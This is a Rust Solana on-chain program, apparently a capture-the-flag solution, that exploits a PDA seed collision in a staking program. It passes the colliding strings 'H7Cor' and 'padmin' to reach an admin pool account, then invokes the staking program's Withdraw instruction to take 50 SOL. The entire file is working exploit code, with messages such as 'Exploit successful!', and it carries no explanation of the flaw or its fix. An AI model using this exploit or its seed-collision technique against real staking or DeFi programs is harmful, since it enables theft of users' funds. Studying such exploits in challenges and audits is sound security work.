use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    msg,
    program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Staking Pool Exploit Starting...");
    
    // Accounts passed by server:
    // 0: User account (writable, signer)
    // 1: Staking program (readonly)
    // 2: Admin pool PDA (writable)
    // 3: System program (readonly)
    
    let user = &accounts[0];
    let staking_program = &accounts[1];
    let admin_pool = &accounts[2];
    // accounts[3] is system_program (unused)
    
    let colliding_org = "H7Cor";
    let colliding_emp = "padmin";
    
    msg!("Using collision: '{}' + '{}'", colliding_org, colliding_emp);
    msg!("Target PDA: {}", admin_pool.key);
    
    let amount_to_steal: u64 = 50_000_000_000;
    
    // Create Borsh-serialized Withdraw instruction
    // StakingInstruction::Withdraw is variant 2
    let mut instruction_data = Vec::new();
    instruction_data.push(2); // Withdraw is the 3rd variant (0=Initialize, 1=Stake, 2=Withdraw)
    instruction_data.extend_from_slice(&amount_to_steal.to_le_bytes());
    
    msg!("Withdrawing {} SOL from admin pool...", amount_to_steal / 1_000_000_000);
    
    // Withdraw expects: [pool_account, user]
    let withdraw_ix = Instruction {
        program_id: *staking_program.key,
        accounts: vec![
            AccountMeta::new(*admin_pool.key, false),  // Pool PDA (writable)
            AccountMeta::new(*user.key, true),         // User (signer, writable)
        ],
        data: instruction_data,
    };
    
    invoke(
        &withdraw_ix,
        &[
            admin_pool.clone(),
            user.clone(),
        ],
    )?;
    
    msg!("Exploit successful!");
    
    Ok(())
}
